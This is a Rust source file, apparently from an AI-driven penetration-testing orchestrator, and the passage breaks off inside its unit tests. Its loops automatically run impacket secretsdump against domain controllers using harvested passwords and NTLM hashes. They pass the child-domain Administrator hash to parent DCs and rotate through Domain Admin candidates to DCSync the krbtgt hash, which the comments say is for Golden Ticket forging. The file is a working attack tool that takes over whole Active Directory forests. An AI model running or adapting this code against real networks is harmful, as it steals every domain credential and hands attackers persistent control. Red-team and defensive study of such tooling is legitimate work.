//! auto_local_admin_secretsdump -- secretsdump with admin creds.

use std::sync::Arc;
use std::time::Duration;

use ares_llm::ToolCall;
use serde_json::{json, Value};
use tokio::sync::watch;
use tracing::{info, warn};

use crate::orchestrator::dispatcher::Dispatcher;
use crate::orchestrator::state::*;

/// Consecutive `Transient` outcomes on one `(dc, domain, principal)` before
/// `auto_krbtgt_extraction` gives up on that principal and rotates to the next
/// candidate. A `Transient` leaves state clean so real network blips retry;
/// this cap stops a principal whose output never advances (never a
/// logon-failure, never a parsed krbtgt) from being re-picked every tick.
const KRBTGT_MAX_TRANSIENT: u32 = 3;

/// Check if a DC domain is a valid secretsdump target for a given credential domain.
/// Allows same domain, child domain, or parent domain.
fn is_valid_secretsdump_target(dc_domain: &str, cred_domain: &str) -> bool {
    let d = dc_domain.to_lowercase();
    let c = cred_domain.to_lowercase();
    d == c || d.ends_with(&format!(".{c}")) || c.ends_with(&format!(".{d}"))
}

/// Check if a child domain is a child of a parent domain for PTH escalation.
fn is_child_of(child: &str, parent: &str) -> bool {
    let c = child.to_lowercase();
    let p = parent.to_lowercase();
    c != p && c.ends_with(&format!(".{p}"))
}

/// Build secretsdump dedup key.
fn secretsdump_dedup_key(ip: &str, domain: &str, username: &str) -> String {
    format!(
        "{}:{}:{}",
        ip,
        domain.to_lowercase(),
        username.to_lowercase()
    )
}

/// Build PTH secretsdump dedup key.
fn pth_secretsdump_dedup_key(dc_ip: &str, parent_domain: &str) -> String {
    format!("{}:{}:pth_admin", dc_ip, parent_domain)
}

/// Domain-scoped dedup key. Marked only after a candidate has successfully
/// extracted the krbtgt hash — ends krbtgt work for the domain.
fn krbtgt_extraction_dedup_key(dc_ip: &str, domain: &str) -> String {
    format!(
        "{}:{}:krbtgt_extraction_direct_v2",
        dc_ip,
        domain.to_lowercase()
    )
}

/// Principal-scoped dedup key. Marked when a candidate credential is rejected
/// by the DC (STATUS_LOGON_FAILURE and friends) so the loop rotates to the
/// next DA candidate instead of hot-looping on a broken (dc, principal) pair.
fn krbtgt_principal_attempt_key(dc_ip: &str, domain: &str, principal: &str) -> String {
    format!(
        "{}:{}:krbtgt_extract_principal:{}",
        dc_ip,
        domain.to_lowercase(),
        principal.to_lowercase()
    )
}

/// Authentication material for a krbtgt-extraction candidate.
#[derive(Debug, Clone, PartialEq, Eq)]
enum KrbtgtAuth {
    Password(String),
    Hash(String),
}

/// A candidate DA identity: `(principal_username, auth)`.
type KrbtgtCandidate = (String, KrbtgtAuth);

/// Enumerate DA-candidate identities for a domain. Prefers NTLM hashes
/// (the classic DCSync input) then falls back to admin credentials with
/// passwords. Skips quarantined principals and delegation accounts. Dedups
/// by username so a principal with both a hash and a password only appears
/// once (hash wins).
fn select_krbtgt_candidates(state: &StateInner, domain: &str) -> Vec<KrbtgtCandidate> {
    let dom = domain.to_lowercase();
    let mut out = Vec::new();
    let mut seen = std::collections::HashSet::new();

    for h in state.hashes.iter().filter(|h| {
        h.domain.to_lowercase() == dom
            && h.hash_type.eq_ignore_ascii_case("NTLM")
            && !h.hash_value.is_empty()
            && !state.is_principal_quarantined(&h.username, &h.domain)
            && !state.is_delegation_account(&h.username)
    }) {
        if seen.insert(h.username.to_lowercase()) {
            out.push((h.username.clone(), KrbtgtAuth::Hash(h.hash_value.clone())));
        }
    }

    for c in state.credentials.iter().filter(|c| {
        c.domain.to_lowercase() == dom
            && !c.password.is_empty()
            && !state.is_principal_quarantined(&c.username, &c.domain)
            && !state.is_delegation_account(&c.username)
    }) {
        if seen.insert(c.username.to_lowercase()) {
            out.push((c.username.clone(), KrbtgtAuth::Password(c.password.clone())));
        }
    }

    out
}

/// Detect a definitive authentication rejection so the caller marks the
/// principal as failed and rotates to the next candidate instead of retrying
/// the same broken pair every 30s.
fn is_logon_failure(output: &str) -> bool {
    let s = output.to_ascii_lowercase();
    s.contains("status_logon_failure")
        || s.contains("status_no_such_user")
        || s.contains("status_account_disabled")
        || s.contains("status_account_locked_out")
        || s.contains("kdc_err_c_principal_unknown")
        || s.contains("kdc_err_preauth_failed")
}

/// Detect impacket's ambiguous-name error. In a multi-domain forest a bare
/// `-just-dc-user krbtgt` maps to more than one object (every domain has a
/// krbtgt) and impacket bails with `ERROR_DS_NAME_ERROR_NOT_UNIQUE`. This is a
/// *retry-with-different-args* signal — re-run as a full dump — NOT a
/// broken-principal signal, so the caller must not mark the principal failed.
fn is_name_not_unique(output: &str) -> bool {
    output
        .to_ascii_lowercase()
        .contains("error_ds_name_error_not_unique")
}

/// Detect a DCSync/DRSUAPI authorization failure: the credential authenticated
/// fine but lacks the directory-replication rights krbtgt extraction needs —
/// i.e. it is not a Domain Admin / DCSync-capable principal. Unlike a transient
/// error, retrying the same principal never helps, so the caller treats this
/// like an auth rejection and rotates to the next candidate.
fn is_dcsync_access_denied(output: &str) -> bool {
    let s = output.to_ascii_lowercase();
    s.contains("rpc_s_access_denied") || s.contains("error_ds_dra_access_denied")
}

/// True when we already have a krbtgt hash for the domain (so the GT step is
/// unblocked and we don't need to re-run DCSync against the DC).
/// A secretsdump work item: `(dedup_key, dc_ip, credential)`.
pub(crate) type SecretsdumpWorkItem = (String, String, ares_core::models::Credential);

/// A PTH secretsdump work item:
/// `(dedup_key, parent_dc_ip, child_domain, admin_ntlm_hash, parent_domain)`.
pub(crate) type PthSecretsdumpWorkItem = (String, String, String, String, String);

/// Select credential-based secretsdump work items for this tick.
///
/// Walks `state.credentials × state.all_domains_with_dcs()` and keeps only
/// cred/DC pairs where the DC's domain is the same forest as the cred (per
/// `is_valid_secretsdump_target`) and the dedup key is unprocessed. Skips
/// quarantined principals and non-admin delegation accounts.
pub(crate) fn select_local_admin_secretsdump_work(state: &StateInner) -> Vec<SecretsdumpWorkItem> {
    let mut items = Vec::new();
    for cred in state
        .credentials
        .iter()
        .filter(|c| !c.domain.is_empty() && !c.password.is_empty())
        .filter(|c| c.is_admin || !state.is_delegation_account(&c.username))
        .filter(|c| !state.is_principal_quarantined(&c.username, &c.domain))
    {
        for (dc_domain, dc_ip) in state.all_domains_with_dcs().iter() {
            if !is_valid_secretsdump_target(dc_domain, &cred.domain) {
                continue;
            }
            let dedup = secretsdump_dedup_key(dc_ip, &cred.domain, &cred.username);
            if !state.is_processed(DEDUP_SECRETSDUMP, &dedup) {
                items.push((dedup, dc_ip.clone(), cred.clone()));
            }
        }
    }
    items
}

/// Select pass-the-hash secretsdump work items targeting parent-domain DCs
/// from dominated-child Administrator NTLM hashes.
///
/// For each `dominated_domains` entry, walks `all_domains_with_dcs()` looking
/// for the lowercased child's parent (`dom.ends_with(".{parent}")`); when one
/// is found AND state has an Administrator NTLM hash for the child, emits a
/// PTH work item against the parent DC. Skips already-processed dedup keys.
pub(crate) fn select_pth_secretsdump_work(state: &StateInner) -> Vec<PthSecretsdumpWorkItem> {
    let mut items = Vec::new();
    for dominated in &state.dominated_domains {
        let dom = dominated.to_lowercase();
        for (dc_domain, dc_ip) in state.all_domains_with_dcs().iter() {
            if !is_child_of(&dom, dc_domain) {
                continue;
            }
            let Some(hash) = state.hashes.iter().find(|h| {
                h.username.to_lowercase() == "administrator"
                    && h.hash_type.to_uppercase() == "NTLM"
                    && h.domain.to_lowercase() == dom
            }) else {
                continue;
            };
            let parent = dc_domain.to_lowercase();
            let dedup = pth_secretsdump_dedup_key(dc_ip, &parent);
            if !state.is_processed(DEDUP_SECRETSDUMP, &dedup) {
                items.push((
                    dedup,
                    dc_ip.clone(),
                    hash.domain.clone(),
                    hash.hash_value.clone(),
                    parent,
                ));
            }
        }
    }
    items
}

fn has_krbtgt_hash(state: &StateInner, domain: &str) -> bool {
    let dom = domain.to_lowercase();
    state.hashes.iter().any(|h| {
        h.username.eq_ignore_ascii_case("krbtgt")
            && h.hash_type.eq_ignore_ascii_case("NTLM")
            && h.domain.to_lowercase() == dom
    })
}

/// Build the `-just-dc-user` value for krbtgt extraction. When the domain's
/// NetBIOS flat name is known, qualify the account (`CHILD/krbtgt`) so a DC
/// hosting multiple naming contexts doesn't answer a bare `krbtgt` with
/// `ERROR_DS_NAME_ERROR_NOT_UNIQUE`. impacket accepts both `NETBIOS/user` and
/// `NETBIOS\user`; the forward slash avoids shell/JSON escaping.
fn krbtgt_just_dc_user(netbios: Option<&str>) -> String {
    match netbios {
        Some(nb) if !nb.trim().is_empty() => format!("{}/krbtgt", nb.trim().to_uppercase()),
        _ => "krbtgt".to_string(),
    }
}

/// Build the secretsdump tool args for a krbtgt extraction attempt.
///
/// `just_dc_user`:
/// * `Some("CHILD/krbtgt")` / `Some("krbtgt")` — narrowed DCSync of one account.
/// * `None` — omit `-just-dc-user` entirely, i.e. a full NTDS dump. Used as the
///   transparent retry when the narrowed lookup came back ambiguous.
fn build_krbtgt_extraction_args(
    dc_ip: &str,
    domain: &str,
    username: &str,
    auth: &KrbtgtAuth,
    just_dc_user: Option<&str>,
) -> Value {
    let mut args = json!({
        "target": dc_ip,
        "target_ip": dc_ip,
        "dc_ip": dc_ip,
        "username": username,
        "domain": domain,
        "target_domain": domain,
        "timeout_minutes": 3,
    });
    if let Some(jdu) = just_dc_user {
        args["just_dc_user"] = json!(jdu);
    }
    match auth {
        KrbtgtAuth::Password(p) => args["password"] = json!(p),
        KrbtgtAuth::Hash(h) => args["hash"] = json!(h),
    }
    args
}

fn discoveries_include_krbtgt(discoveries: Option<&Value>, domain: &str) -> bool {
    let dom = domain.to_lowercase();
    discoveries
        .and_then(|d| d.get("hashes"))
        .and_then(Value::as_array)
        .is_some_and(|hashes| {
            hashes.iter().any(|h| {
                let username_matches = h
                    .get("username")
                    .and_then(Value::as_str)
                    .is_some_and(|u| u.eq_ignore_ascii_case("krbtgt"));
                let domain_matches = h
                    .get("domain")
                    .and_then(Value::as_str)
                    .is_some_and(|d| d.eq_ignore_ascii_case(&dom));
                let hash_type_matches = h
                    .get("hash_type")
                    .and_then(Value::as_str)
                    .is_none_or(|t| t.eq_ignore_ascii_case("ntlm"));
                username_matches && domain_matches && hash_type_matches
            })
        })
}

/// Outcome of a krbtgt-extraction attempt (after any internal retry).
///
/// * `Success` — krbtgt hash captured; the domain is done.
/// * `AuthRejected` — a terminal per-principal failure: the DC rejected the
///   credential (STATUS_LOGON_FAILURE and friends) OR authenticated it but
///   denied DCSync (not a Domain Admin). Either way retrying the same
///   principal is pointless, so the caller marks it and rotates.
/// * `Transient` — anything else (dispatch error, timeout, unparsable
///   output). The caller leaves state untouched so the next tick can retry.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum KrbtgtOutcome {
    Success,
    AuthRejected,
    Transient,
}

/// Fine-grained classification of a single secretsdump attempt, before the
/// retry decision in [`dispatch_krbtgt_extraction_direct`] collapses it into a
/// [`KrbtgtOutcome`]. `NameNotUnique` is separated out because it is the only
/// class that triggers a same-tick retry (as a full dump) rather than being a
/// terminal verdict on the principal.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum DumpClass {
    Success,
    AuthRejected,
    NameNotUnique,
    Transient,
}

/// Classify a completed secretsdump result. Order matters: a parsed krbtgt hash
/// wins over everything; an ambiguous-name error is a retry signal (checked
/// before the rejection detectors so it can't be mistaken for a broken
/// principal); logon-failure and DCSync-denied are both terminal per-principal
/// rejections; anything else is transient.
fn classify_krbtgt_result(discoveries: Option<&Value>, output: &str, domain: &str) -> DumpClass {
    if discoveries_include_krbtgt(discoveries, domain) {
        DumpClass::Success
    } else if is_name_not_unique(output) {
        DumpClass::NameNotUnique
    } else if is_logon_failure(output) || is_dcsync_access_denied(output) {
        DumpClass::AuthRejected
    } else {
        DumpClass::Transient
    }
}

/// Dispatch a single secretsdump attempt and classify its result.
async fn run_krbtgt_dump(
    dispatcher: &Dispatcher,
    dc_ip: &str,
    domain: &str,
    username: &str,
    auth: &KrbtgtAuth,
    just_dc_user: Option<&str>,
) -> DumpClass {
    let task_id = format!("krbtgt_extract_{}", uuid::Uuid::new_v4().simple());
    let auth_kind = match auth {
        KrbtgtAuth::Password(_) => "password",
        KrbtgtAuth::Hash(_) => "hash",
    };
    let call = ToolCall {
        id: format!("{}_call", task_id),
        name: "secretsdump".to_string(),
        arguments: build_krbtgt_extraction_args(dc_ip, domain, username, auth, just_dc_user),
    };

    info!(
        task_id = %task_id,
        dc = %dc_ip,
        domain = %domain,
        principal = %username,
        auth_kind = %auth_kind,
        just_dc_user = %just_dc_user.unwrap_or("<full-dump>"),
        "krbtgt extraction dispatched (direct tool)"
    );

    match dispatcher
        .llm_runner
        .tool_dispatcher()
        .dispatch_tool("credential_access", &task_id, &call)
        .await
    {
        Ok(result) => {
            let class = classify_krbtgt_result(result.discoveries.as_ref(), &result.output, domain);
            match class {
                DumpClass::Success => info!(
                    task_id = %task_id, dc = %dc_ip, domain = %domain, principal = %username,
                    "krbtgt extraction completed with parsed krbtgt hash"
                ),
                DumpClass::NameNotUnique => warn!(
                    task_id = %task_id, dc = %dc_ip, domain = %domain, principal = %username,
                    "krbtgt lookup ambiguous (ERROR_DS_NAME_ERROR_NOT_UNIQUE) — will retry as full dump"
                ),
                DumpClass::AuthRejected => warn!(
                    task_id = %task_id, dc = %dc_ip, domain = %domain, principal = %username,
                    auth_kind = %auth_kind,
                    "krbtgt extraction rejected (bad creds or no DCSync rights) — dropping principal for this run"
                ),
                DumpClass::Transient => warn!(
                    task_id = %task_id, dc = %dc_ip, domain = %domain, principal = %username,
                    error = ?result.error, output_len = result.output.len(),
                    "krbtgt extraction completed without parsed krbtgt hash; will retry"
                ),
            }
            class
        }
        Err(e) => {
            warn!(
                err = %e,
                dc = %dc_ip,
                domain = %domain,
                principal = %username,
                "Failed to dispatch direct krbtgt extraction"
            );
            DumpClass::Transient
        }
    }
}

/// Extract krbtgt for one `(dc, domain, principal)` pair, qualifying
/// `-just-dc-user` with the domain's NetBIOS flat name when known and
/// transparently retrying as a full NTDS dump if the narrowed lookup comes back
/// ambiguous (`ERROR_DS_NAME_ERROR_NOT_UNIQUE`).
async fn dispatch_krbtgt_extraction_direct(
    dispatcher: &Dispatcher,
    dc_ip: &str,
    domain: &str,
    username: &str,
    auth: &KrbtgtAuth,
    netbios: Option<&str>,
) -> KrbtgtOutcome {
    // Attempt 1: narrowed `-just-dc-user`, NetBIOS-qualified when known.
    let jdu = krbtgt_just_dc_user(netbios);
    let class = run_krbtgt_dump(dispatcher, dc_ip, domain, username, auth, Some(&jdu)).await;

    // On ambiguity, retry once without `-just-dc-user`. impacket then dumps the
    // whole NTDS (no name to disambiguate), and the output parser attributes
    // the krbtgt row via the dump's own $MACHINE.ACC / domain-prefixed markers.
    let class = if class == DumpClass::NameNotUnique {
        warn!(
            dc = %dc_ip,
            domain = %domain,
            principal = %username,
            "retrying krbtgt extraction as full NTDS dump"
        );
        run_krbtgt_dump(dispatcher, dc_ip, domain, username, auth, None).await
    } else {
        class
    };

    match class {
        DumpClass::Success => KrbtgtOutcome::Success,
        DumpClass::AuthRejected => KrbtgtOutcome::AuthRejected,
        // A NameNotUnique that survived the full-dump retry (shouldn't happen)
        // or any other non-terminal result is transient — retry next tick.
        DumpClass::NameNotUnique | DumpClass::Transient => KrbtgtOutcome::Transient,
    }
}

/// Dispatches secretsdump when admin credentials are detected.
/// Interval: 30s.
pub async fn auto_local_admin_secretsdump(
    dispatcher: Arc<Dispatcher>,
    mut shutdown: watch::Receiver<bool>,
) {
    let mut interval = tokio::time::interval(Duration::from_secs(30));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        // Strategy gate: skip if secretsdump is excluded.
        if !dispatcher.is_technique_allowed("secretsdump") {
            continue;
        }

        let work: Vec<SecretsdumpWorkItem> = {
            let state = dispatcher.state.read().await;
            select_local_admin_secretsdump_work(&state)
        };

        for (dedup_key, dc_ip, cred) in work.into_iter().take(3) {
            let priority = if cred.is_admin { 2 } else { 5 };
            match dispatcher
                .request_secretsdump(&dc_ip, &cred, priority)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(task_id = %task_id, dc = %dc_ip, user = %cred.username, "Admin secretsdump dispatched");
                    {
                        let mut state = dispatcher.state.write().await;
                        state.mark_processed(DEDUP_SECRETSDUMP, dedup_key.clone());
                        state.mark_credential_capture_in_flight(&cred.domain);
                    }
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_SECRETSDUMP, &dedup_key)
                        .await;
                }
                Ok(None) => {}
                Err(e) => warn!(err = %e, "Failed to dispatch secretsdump"),
            }
        }

        // Hash-based secretsdump: when we dominate a child domain, use the
        // Administrator NTLM hash to PTH against parent domain DCs.
        // This covers child-to-parent escalation (e.g. child.contoso.local
        // → contoso.local) where password-based creds won't have admin
        // rights on the parent DC.
        // Strategy gate: skip dc_secretsdump if excluded.
        if !dispatcher.is_technique_allowed("dc_secretsdump") {
            continue;
        }

        let hash_work: Vec<PthSecretsdumpWorkItem> = {
            let state = dispatcher.state.read().await;
            select_pth_secretsdump_work(&state)
        };

        for (dedup_key, dc_ip, hash_domain, hash_value, parent_domain) in
            hash_work.into_iter().take(2)
        {
            let priority = dispatcher.effective_priority("dc_secretsdump");
            match dispatcher
                .request_secretsdump_hash(
                    &dc_ip,
                    "Administrator",
                    &hash_domain,
                    &hash_value,
                    priority,
                    None,
                )
                .await
            {
                Ok(Some(task_id)) => {
                    info!(
                        task_id = %task_id,
                        dc = %dc_ip,
                        hash_domain = %hash_domain,
                        "PTH secretsdump dispatched against parent DC"
                    );
                    {
                        let mut state = dispatcher.state.write().await;
                        state.mark_processed(DEDUP_SECRETSDUMP, dedup_key.clone());
                        state.mark_credential_capture_in_flight(&parent_domain);
                    }
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_SECRETSDUMP, &dedup_key)
                        .await;
                }
                Ok(None) => {}
                Err(e) => warn!(err = %e, "Failed to dispatch PTH secretsdump"),
            }
        }
    }
}

/// Dispatches a narrowed `secretsdump -just-dc-user krbtgt` for any domain
/// whose krbtgt hash we haven't captured yet, rotating through candidate DA
/// identities (Administrator NTLM hash, then any admin credential with a
/// password) one per tick.
///
/// Closes the gap between "DA captured" and "Golden Ticket forged": the
/// existing `auto_local_admin_secretsdump` only fires the PtH path on
/// child→parent escalation (gated on `dominated_domains`), and the generic
/// credential_access prompt lets the LLM omit `-just-dc-user` or mis-shape
/// arg names. Dispatching the tool directly with structured args avoids
/// both.
///
/// `-just-dc-user` is qualified with the domain's NetBIOS flat name
/// (`CHILD/krbtgt`) when known, so a multi-domain DC doesn't answer a bare
/// `krbtgt` with `ERROR_DS_NAME_ERROR_NOT_UNIQUE`; if the narrowed lookup is
/// still ambiguous, the dispatch path retries once as a full NTDS dump.
///
/// On `STATUS_LOGON_FAILURE` (and other definitive auth rejections, including
/// `rpc_s_access_denied` from a non-DCSync principal) the principal is marked
/// failed for this DC so the loop advances to the next candidate instead of
/// hot-looping a broken pair. Persistent non-advancing `Transient` output is
/// also rotated after `KRBTGT_MAX_TRANSIENT` ticks. On success, the
/// domain-scoped dedup ends krbtgt work for that domain and
/// `auto_golden_ticket` takes over.
pub async fn auto_krbtgt_extraction(
    dispatcher: Arc<Dispatcher>,
    mut shutdown: watch::Receiver<bool>,
) {
    let mut interval = tokio::time::interval(Duration::from_secs(30));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        if !dispatcher.is_technique_allowed("dc_secretsdump") {
            continue;
        }

        // Per tick, pick the first (dc, domain, principal) triple with both
        // an untried domain and an untried candidate. Rotating one principal
        // per tick keeps blast radius low while still advancing.
        type KrbtgtSelection = (
            String,
            String,
            String,
            String,
            String,
            Option<String>,
            KrbtgtAuth,
        );
        let selection: Option<KrbtgtSelection> = {
            let state = dispatcher.state.read().await;
            let mut chosen = None;
            'outer: for (dc_domain, dc_ip) in state.all_domains_with_dcs().iter() {
                let dom = dc_domain.to_lowercase();
                if has_krbtgt_hash(&state, &dom) {
                    continue;
                }
                let domain_dedup = krbtgt_extraction_dedup_key(dc_ip, &dom);
                if state.is_processed(DEDUP_SECRETSDUMP, &domain_dedup) {
                    continue;
                }
                for (principal, auth) in select_krbtgt_candidates(&state, &dom) {
                    let principal_dedup = krbtgt_principal_attempt_key(dc_ip, &dom, &principal);
                    if state.is_processed(DEDUP_SECRETSDUMP, &principal_dedup) {
                        continue;
                    }
                    chosen = Some((
                        domain_dedup,
                        principal_dedup,
                        dc_ip.clone(),
                        dom.clone(),
                        principal,
                        // NetBIOS flat name to disambiguate `-just-dc-user` in a
                        // multi-domain forest; `None` falls back to bare krbtgt
                        // plus the full-dump retry inside the dispatch path.
                        resolve_fqdn_to_flat(&dom, &state),
                        auth,
                    ));
                    break 'outer;
                }
            }
            chosen
        };

        let Some((domain_dedup, principal_dedup, dc_ip, domain, principal, netbios, auth)) =
            selection
        else {
            continue;
        };

        {
            let mut state = dispatcher.state.write().await;
            state.mark_credential_capture_in_flight(&domain);
        }

        match dispatch_krbtgt_extraction_direct(
            &dispatcher,
            &dc_ip,
            &domain,
            &principal,
            &auth,
            netbios.as_deref(),
        )
        .await
        {
            KrbtgtOutcome::Success => {
                {
                    let mut state = dispatcher.state.write().await;
                    state.mark_processed(DEDUP_SECRETSDUMP, domain_dedup.clone());
                    state.mark_credential_capture_in_flight(&domain);
                    state.krbtgt_transient_counts.remove(&principal_dedup);
                }
                let _ = dispatcher
                    .state
                    .persist_dedup(&dispatcher.queue, DEDUP_SECRETSDUMP, &domain_dedup)
                    .await;
            }
            KrbtgtOutcome::AuthRejected => {
                {
                    let mut state = dispatcher.state.write().await;
                    state.mark_processed(DEDUP_SECRETSDUMP, principal_dedup.clone());
                    state.krbtgt_transient_counts.remove(&principal_dedup);
                }
                let _ = dispatcher
                    .state
                    .persist_dedup(&dispatcher.queue, DEDUP_SECRETSDUMP, &principal_dedup)
                    .await;
            }
            KrbtgtOutcome::Transient => {
                // Leave the domain/principal dedup clean so genuine blips
                // retry — but bound the churn. After KRBTGT_MAX_TRANSIENT
                // consecutive non-advancing Transients on this principal,
                // rotate as if it were rejected.
                let promote = {
                    let mut state = dispatcher.state.write().await;
                    let count = state
                        .krbtgt_transient_counts
                        .entry(principal_dedup.clone())
                        .or_insert(0);
                    *count += 1;
                    if *count >= KRBTGT_MAX_TRANSIENT {
                        state.mark_processed(DEDUP_SECRETSDUMP, principal_dedup.clone());
                        state.krbtgt_transient_counts.remove(&principal_dedup);
                        true
                    } else {
                        false
                    }
                };
                if promote {
                    warn!(
                        dc = %dc_ip,
                        domain = %domain,
                        principal = %principal,
                        threshold = KRBTGT_MAX_TRANSIENT,
                        "krbtgt principal stuck in Transient — rotating to next candidate"
                    );
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_SECRETSDUMP, &principal_dedup)
                        .await;
                }
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    #[test]
    fn valid_secretsdump_target_same_domain() {
        assert!(is_valid_secretsdump_target(
            "contoso.local",
            "contoso.local"
        ));
    }

    #[test]
    fn valid_secretsdump_target_case_insensitive() {
        assert!(is_valid_secretsdump_target(
            "CONTOSO.LOCAL",
            "contoso.local"
        ));
    }

    #[test]
    fn valid_secretsdump_target_dc_is_child() {
        assert!(is_valid_secretsdump_target(
            "child.contoso.local",
            "contoso.local"
        ));
    }

    #[test]
    fn valid_secretsdump_target_dc_is_parent() {
        assert!(is_valid_secretsdump_target(
            "contoso.local",
            "child.contoso.local"
        ));
    }

    #[test]
    fn valid_secretsdump_target_unrelated_rejected() {
        assert!(!is_valid_secretsdump_target(
            "fabrikam.local",
            "contoso.local"
        ));
    }

    #[test]
    fn valid_secretsdump_target_empty_strings() {
        assert!(is_valid_secretsdump_target("", ""));
    }

    #[test]
    fn valid_secretsdump_target_one_empty() {
        assert!(!is_valid_secretsdump_target("contoso.local", ""));
    }

    #[test]
    fn is_child_of_basic() {
        assert!(is_child_of("child.contoso.local", "contoso.local"));
    }

    #[test]
    fn is_child_of_case_insensitive() {
        assert!(is_child_of("CHILD.CONTOSO.LOCAL", "contoso.local"));
    }

    #[test]
    fn is_child_of_deeply_nested() {
        assert!(is_child_of("deep.child.contoso.local", "contoso.local"));
    }

    #[test]
    fn is_child_of_same_domain_rejected() {
        assert!(!is_child_of("contoso.local", "contoso.local"));
    }

    #[test]
    fn is_child_of_parent_not_child() {
        assert!(!is_child_of("contoso.local", "child.contoso.local"));
    }

    #[test]
    fn is_child_of_unrelated_rejected() {
        assert!(!is_child_of("fabrikam.local", "contoso.local"));
    }

    #[test]
    fn is_child_of_empty_strings() {
        assert!(!is_child_of("", ""));
    }

    #[test]
    fn secretsdump_dedup_key_basic() {
        assert_eq!(
            secretsdump_dedup_key("192.168.58.1", "contoso.local", "Administrator"),
            "192.168.58.1:contoso.local:administrator"
        );
    }

    #[test]
    fn secretsdump_dedup_key_lowercases() {
        assert_eq!(
            secretsdump_dedup_key("192.168.58.1", "CONTOSO.LOCAL", "ADMIN"),
            "192.168.58.1:contoso.local:admin"
        );
    }

    #[test]
    fn secretsdump_dedup_key_empty_fields() {
        assert_eq!(secretsdump_dedup_key("", "", ""), "::");
    }

    #[test]
    fn pth_secretsdump_dedup_key_basic() {
        assert_eq!(
            pth_secretsdump_dedup_key("192.168.58.1", "contoso.local"),
            "192.168.58.1:contoso.local:pth_admin"
        );
    }

    #[test]
    fn pth_secretsdump_dedup_key_preserves_ip() {
        let key = pth_secretsdump_dedup_key("192.168.58.100", "contoso.local");
        assert!(key.starts_with("192.168.58.100:"));
    }

    #[test]
    fn pth_secretsdump_dedup_key_empty_fields() {
        assert_eq!(pth_secretsdump_dedup_key("", ""), "::pth_admin");
    }

    #[test]
    fn krbtgt_extraction_dedup_key_is_direct_path() {
        assert_eq!(
            krbtgt_extraction_dedup_key("192.168.58.20", "CONTOSO.LOCAL"),
            "192.168.58.20:contoso.local:krbtgt_extraction_direct_v2"
        );
    }

    #[test]
    fn build_krbtgt_extraction_args_with_hash() {
        let auth = KrbtgtAuth::Hash(
            "aad3b435b51404eeaad3b435b51404ee:0123456789abcdef0123456789abcdef".into(),
        );
        let args = build_krbtgt_extraction_args(
            "192.168.58.20",
            "contoso.local",
            "Administrator",
            &auth,
            Some("krbtgt"),
        );
        assert_eq!(args["target"], "192.168.58.20");
        assert_eq!(args["target_ip"], "192.168.58.20");
        assert_eq!(args["dc_ip"], "192.168.58.20");
        assert_eq!(args["username"], "Administrator");
        assert_eq!(args["domain"], "contoso.local");
        assert_eq!(args["target_domain"], "contoso.local");
        assert_eq!(
            args["hash"],
            "aad3b435b51404eeaad3b435b51404ee:0123456789abcdef0123456789abcdef"
        );
        assert!(args.get("password").is_none());
        assert_eq!(args["just_dc_user"], "krbtgt");
        assert_eq!(args["timeout_minutes"], 3);
    }

    #[test]
    fn build_krbtgt_extraction_args_with_password() {
        let auth = KrbtgtAuth::Password("P@ssw0rd!".into());
        let args = build_krbtgt_extraction_args(
            "192.168.58.20",
            "contoso.local",
            "alice",
            &auth,
            Some("krbtgt"),
        );
        assert_eq!(args["username"], "alice");
        assert_eq!(args["password"], "P@ssw0rd!");
        assert!(args.get("hash").is_none());
        assert_eq!(args["just_dc_user"], "krbtgt");
    }

    #[test]
    fn build_krbtgt_extraction_args_qualified_netbios() {
        let auth = KrbtgtAuth::Password("Pw".into());
        let args = build_krbtgt_extraction_args(
            "192.168.58.20",
            "child.contoso.local",
            "alice",
            &auth,
            Some("CHILD/krbtgt"),
        );
        assert_eq!(args["just_dc_user"], "CHILD/krbtgt");
    }

    #[test]
    fn build_krbtgt_extraction_args_full_dump_omits_just_dc_user() {
        // `None` => omit `-just-dc-user` entirely (full NTDS dump retry).
        let auth = KrbtgtAuth::Password("Pw".into());
        let args =
            build_krbtgt_extraction_args("192.168.58.20", "contoso.local", "alice", &auth, None);
        assert!(args.get("just_dc_user").is_none());
        assert_eq!(args["password"], "Pw");
    }

    #[test]
    fn krbtgt_just_dc_user_qualifies_when_netbios_known() {
        assert_eq!(krbtgt_just_dc_user(Some("child")), "CHILD/krbtgt");
        assert_eq!(krbtgt_just_dc_user(Some("FABRIKAM")), "FABRIKAM/krbtgt");
    }

    #[test]
    fn krbtgt_just_dc_user_bare_when_unknown() {
        assert_eq!(krbtgt_just_dc_user(None), "krbtgt");
        assert_eq!(krbtgt_just_dc_user(Some("")), "krbtgt");
        assert_eq!(krbtgt_just_dc_user(Some("   ")), "krbtgt");
    }

    #[test]
    fn is_name_not_unique_detects_impacket_error() {
        let output = "[-] ERROR_DS_NAME_ERROR_NOT_UNIQUE: Name translation: Input name \
            mapped to more than one output name.";
        assert!(is_name_not_unique(output));
    }

    #[test]
    fn is_name_not_unique_ignores_other_output() {
        assert!(!is_name_not_unique("STATUS_LOGON_FAILURE"));
        assert!(!is_name_not_unique(""));
    }

    #[test]
    fn is_dcsync_access_denied_detects_rpc_and_dra() {
        assert!(is_dcsync_access_denied(
            "[-] DRSR SessionError: code: 0x5 - RPC_S_ACCESS_DENIED"
        ));
        assert!(is_dcsync_access_denied(
            "[-] ERROR_DS_DRA_ACCESS_DENIED while replicating"
        ));
    }

    #[test]
    fn is_dcsync_access_denied_ignores_logon_failure() {
        assert!(!is_dcsync_access_denied("STATUS_LOGON_FAILURE"));
        assert!(!is_dcsync_access_denied(""));
    }

    #[test]
    fn classify_krbtgt_result_success_beats_everything() {
        let discoveries = json!({
            "hashes": [{
                "username": "krbtgt",
                "domain": "contoso.local",
                "hash_type": "ntlm",
                "hash_value": "lm:nt"
            }]
        });
